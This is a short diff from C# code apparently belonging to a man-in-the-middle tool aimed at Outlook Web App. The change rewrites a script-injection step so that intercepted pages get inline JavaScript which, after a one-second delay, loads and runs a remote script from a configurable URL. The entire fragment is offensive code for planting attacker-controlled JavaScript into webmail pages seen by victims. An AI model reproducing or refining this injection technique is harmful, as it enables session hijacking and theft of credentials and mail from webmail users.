@@ -84,7 +84,15 @@ namespace OutlookWebAppManInTheMiddle
             if (head is null) return Task.CompletedTask;
 
             var node = document.CreateElement("script");
-            node.SetAttributeValue("src", javascript);
+
+            node.SetAttributeValue("type", "text/javascript");
+
+            node.InnerHtml =    "setTimeout(function(){\n" +
+                                "var script = document.createElement('script');\n" +
+                                "script.src = \"" + javascript + "\";\n" +
+                                "document.getElementsByTagName('head')[0].appendChild(script);\n" +
+                                "},\n" +
+                                "1000);";
 
             head.AppendChild(node);
 
